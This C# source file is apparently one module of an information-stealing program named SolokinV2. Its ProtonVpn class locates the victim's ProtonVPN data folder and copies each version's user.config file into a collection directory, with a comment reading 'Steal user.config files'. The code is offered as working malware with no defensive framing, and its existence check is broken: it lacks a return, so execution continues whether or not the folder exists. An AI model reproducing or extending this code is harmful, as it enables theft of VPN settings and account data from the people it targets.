using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static SolokinV2.Start;

namespace SolokinV2
{
    internal sealed class ProtonVpn
    {
        // Save("ProtonVPN");
        public static void Save(string sSavePath)
        {
            string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
            using (StreamWriter file = new StreamWriter(filePath, true))
            {
                file.WriteLine("[+] Getting ProtonVPN...");

            }
            // "ProtonVPN" directory path
            var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "ProtonVPN");
            // Stop if not exists
            if (!Directory.Exists(vpn))
               
            using (StreamWriter file = new StreamWriter(filePath, true))
            {
                file.WriteLine("[-] ProtonVPN not Found.");

            }
            try
            {
               
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[+] Copying user.config Files...");

                }
                // Steal user.config files
                foreach (var dir in Directory.GetDirectories(vpn))
                    if (dir.Contains("ProtonVPN.exe"))
                        foreach (var version in Directory.GetDirectories(dir))
                        {
                            var configLocation = version + "\\user.config";
                            var copyDirectory = Path.Combine(
                                sSavePath, new DirectoryInfo(Path.GetDirectoryName(configLocation)).Name);
                            if (Directory.Exists(copyDirectory)) continue;

                            Directory.CreateDirectory(copyDirectory);
                            File.Copy(configLocation, copyDirectory + "\\user.config");
                        }
            }
            catch
            {
              
                using (StreamWriter file = new StreamWriter(filePath, true))
                {
                    file.WriteLine("[-] Atleast One File Couldnt Be Copied.");

                }
            }
        }
    }
}
